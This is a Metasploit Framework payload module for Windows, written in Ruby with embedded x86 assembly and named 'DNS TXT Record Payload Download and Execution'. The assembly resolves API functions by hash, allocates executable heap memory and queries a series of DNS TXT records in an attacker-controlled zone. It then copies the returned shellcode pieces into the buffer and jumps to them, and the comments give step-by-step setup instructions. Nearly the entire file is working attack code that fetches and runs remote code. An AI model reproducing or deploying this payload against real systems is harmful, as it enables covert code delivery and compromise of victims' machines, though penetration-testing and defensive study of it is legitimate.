##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

module Metasploit3

	include Msf::Payload::Windows
	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'DNS TXT Record Payload Download and Execution',
			'Description'   => 'Performs a TXT query against a series of DNS record(s) and executes the returned payload',
			'Author'        =>
				[
					'corelanc0d3r <peter.ve[at]corelan.be>'
				],
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86
		))

		# EXITFUNC is not supported
		deregister_options('EXITFUNC')

		# Register command execution options
		register_options(
			[
				OptString.new('DNSZONE', [ true, "The DNS zone to query" ]),
			], self.class)
	end

	#
	# Usage :
	# 1. Generate the shellcode you want to deliver via DNS TXT queries
	#    Make sure the shellcode is alpha_mixed or alpha_upper and uses EDI as bufferregister
	#    Example :
	#   ./msfpayload windows/messagebox TITLE="Friendly message from corelanc0d3r" TEXT="DNS Payloads FTW" R | ./msfencode -e x86/alpha_mixed Bufferregister=EDI -t raw
	#    Output : 654 bytes
	# 2. Split the alpha shellcode into individual parts of exactly 255 bytes (+ remaining bytes)
	#    In case of 654 bytes of payload, there will be 2 parts of 255 bytes, and one part of 144 bytes
	# 3. Create TXT records in a zone you control and put in a piece of the shellcode in each TXT record
	#    The last TXT record might have less than 255 bytes, that's fine
	#    The first part must be stored in the TXT record for prefix a.<yourdomain.com>
	#    The second part must be stored in the TXT record for b.<yourdomain.com>
	#    etc
	#    First part must start with a.  and all parts must be placed in consecutive records
	# 4. use the dns_txt_query payload in the exploit, specify the name of the DNS zone that contains the DNS TXT records
	#    Example : /msfpayload windows/dns_txt_query_exec DNSZONE=corelan.eu C
	#    (Example will show a messagebox)
	#
	# DNS TXT Records :
	# a.corelan.eu	: contains first 255 bytes of the alpha shellcode
	# b.corelan.eu	: contains the next 255 bytes of the alpha shellcode
	# c.corelan.eu	: contains the last 144 bytes of the alpha shellcode

	def generate

		dnsname		= datastore['DNSZONE']
		wType		= 0x0010	#DNS_TYPE_TEXT (TEXT)
		wTypeOffset	= 0x1c

		queryoptions	= 0x248
			# DNS_QUERY_RETURN_MESSAGE (0x200)
			# DNS_QUERY_BYPASS_CACHE (0x08)
			# DNS_QUERY_NO_HOSTS_FILE (0x40)
			# DNS_QUERY_ONLY_TCP (0x02) <- not used atm

		bufferreg 	= "edi"

		#create actual payload
		payload_data = <<EOS
	cld			; clear direction flag
	call start		; start main routine
; Stephen Fewer's block_api
; block_api code (Stephen Fewer)
api_call:
	pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
	mov ebp, esp           ; Create a new stack frame
	xor edx, edx           ; Zero EDX
	mov edx, fs:[edx+48]   ; Get a pointer to the PEB
	mov edx, [edx+12]      ; Get PEB->Ldr
	mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
next_mod:
	mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
	movzx ecx, word [edx+38] ; Set ECX to the length we want to check
	xor edi, edi           ; Clear EDI which will store the hash of the module name
loop_modname:            ;
	xor eax, eax           ; Clear EAX
	lodsb                  ; Read in the next byte of the name
	cmp al, 'a'            ; Some versions of Windows use lower case module names
	jl not_lowercase       ;
	sub al, 0x20           ; If so normalise to uppercase
not_lowercase:           ;
	ror edi, 13            ; Rotate right our hash value
	add edi, eax           ; Add the next byte of the name
	loop loop_modname      ; Loop until we have read enough
	; We now have the module hash computed
	push edx               ; Save the current position in the module list for later
	push edi               ; Save the current module hash for later
	; Proceed to iterate the export address table,
	mov edx, [edx+16]      ; Get this modules base address
	mov eax, [edx+60]      ; Get PE header
	add eax, edx           ; Add the modules base address
	mov eax, [eax+120]     ; Get export tables RVA
	test eax, eax          ; Test if no export address table is present
	jz get_next_mod1       ; If no EAT present, process the next module
	add eax, edx           ; Add the modules base address
	push eax               ; Save the current modules EAT
	mov ecx, [eax+24]      ; Get the number of function names
	mov ebx, [eax+32]      ; Get the rva of the function names
	add ebx, edx           ; Add the modules base address
	; Computing the module hash + function hash
get_next_func:           ;
	jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
	dec ecx                ; Decrement the function name counter
	mov esi, [ebx+ecx*4]   ; Get rva of next module name
	add esi, edx           ; Add the modules base address
	xor edi, edi           ; Clear EDI which will store the hash of the function name
	; And compare it to the one we want
loop_funcname:           ;
	xor eax, eax           ; Clear EAX
	lodsb                  ; Read in the next byte of the ASCII function name
	ror edi, 13            ; Rotate right our hash value
	add edi, eax           ; Add the next byte of the name
	cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
	jne loop_funcname      ; If we have not reached the null terminator, continue
	add edi, [ebp-8]       ; Add the current module hash to the function hash
	cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
	jnz get_next_func      ; Go compute the next function hash if we have not found it
	; If found, fix up stack, call the function and then value else compute the next one...
	pop eax                ; Restore the current modules EAT
	mov ebx, [eax+36]      ; Get the ordinal table rva
	add ebx, edx           ; Add the modules base address
	mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
	mov ebx, [eax+28]      ; Get the function addresses table rva
	add ebx, edx           ; Add the modules base address
	mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
	add eax, edx           ; Add the modules base address to get the functions actual VA
	; We now fix up the stack and perform the call to the desired function...
finish:
	mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
	pop ebx                ; Clear off the current modules hash
	pop ebx                ; Clear off the current position in the module list
	popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
	pop ecx                ; Pop off the origional return address our caller will have pushed
	pop edx                ; Pop off the hash value our caller will have pushed
	push ecx               ; Push back the correct return value
	jmp eax                ; Jump into the required function
	; We now automagically return to the correct caller...
get_next_mod:            ;
	pop eax                ; Pop off the current (now the previous) modules EAT
get_next_mod1:           ;
	pop edi                ; Pop off the current (now the previous) modules hash
	pop edx                ; Restore our position in the module list
	mov edx, [edx]         ; Get the next module
	jmp.i8 next_mod        ; Process this module

; actual routine
start:
	pop ebp			; get ptr to block_api routine

; first allocate some space in heap to hold payload
alloc_space:
	xor eax,eax		; clear EAX
	push 0x40		; flProtect (RWX)
	mov ah,0x10		; set EAX to 0x1000 (should be big enough to hold up to 26 * 255 bytes)
	push eax		; flAllocationType MEM_COMMIT (0x1000)
	push eax		; dwSize (0x1000)
	push 0x0		; lpAddress
	push 0xE553A458        	; kernel32.dll!VirtualAlloc
	call ebp
	push eax		; save pointer on stack, will be used in memcpy
	mov #{bufferreg}, eax	; save pointer, to jump to at the end


;load dnsapi.dll
load_dnsapi:
	xor eax,eax		; put part of string (hex) in eax
	mov al,0x70
	mov ah,0x69
	push eax        	; Push 'dnsapi' to the stack
	push 0x61736e64        	; ...
	push esp               	; Push a pointer to the 'dnsapi' string on the stack.
	push 0x0726774C        	; kernel32.dll!LoadLibraryA
	call ebp               	; LoadLibraryA( "dnsapi" )

;prepare for loop of queries
	mov bl,0x61		; first query, start with 'a'

dnsquery:
	jmp.i8 get_dnsname	; get dnsname

get_dnsname_return:
	pop eax			; get ptr to dnsname (lpstrName)
	mov [eax],bl		; patch sequence number in place
	xchg esi,ebx		; save sequence number
	push esp		; prepare ppQueryResultsSet
	pop ebx			;   (put ptr to ptr to stack on stack)
	sub ebx,4
	push ebx
	push 0x0		; pReserved
	push ebx		; ppQueryResultsSet
	push 0x0		; pExtra
	push #{queryoptions}	; Options
	push #{wType}		; wType
	push eax		; lpstrName
	push 0xC99CC96A 	; dnsapi.dll!DnsQuery_A
	call ebp		;
	test eax, eax		; query ok ?
	jnz jump_to_payload	; no, jump to payload
	jmp.i8 get_query_result	; eax = 0 : a piece returned, fetch it


get_dnsname:
	call get_dnsname_return
	db "a.#{dnsname}", 0x00

get_query_result:
	xchg #{bufferreg},edx	; save start of heap
	pop #{bufferreg}	; heap structure containing DNS results
	mov eax,[#{bufferreg}+0x18]	; check if value at offset 0x18 is 0x1
	cmp eax,1
	jne prepare_payload	; jmp to payload
	add #{bufferreg},#{wTypeOffset}	; get ptr to ptr to DNS reply
	mov #{bufferreg},[#{bufferreg}] ; get ptr to DNS reply

copy_piece_to_heap:
	xchg ebx,esi		; save counter
	mov esi,edi		; set source
	mov edi,[esp+0x8]	; retrieve heap destination for memcpy
	xor ecx,ecx		; clear ecx
	mov cl,0xff		; always copy 255 bytes, no matter what
	rep movsb		; copy from ESI to EDI
	push edi		; save target for next copy
	push edi		; 2 more times to make sure it's at esp+8
	push edi		;
	inc ebx			; increment sequence
	xchg #{bufferreg},edx	; restore start of heap
	jmp.i8 dnsquery	        ; try to get the next piece, if any

prepare_payload:
	mov #{bufferreg},edx

jump_to_payload:
	jmp #{bufferreg}	; jump to it



EOS
		self.assembly = payload_data
		super
	end
end
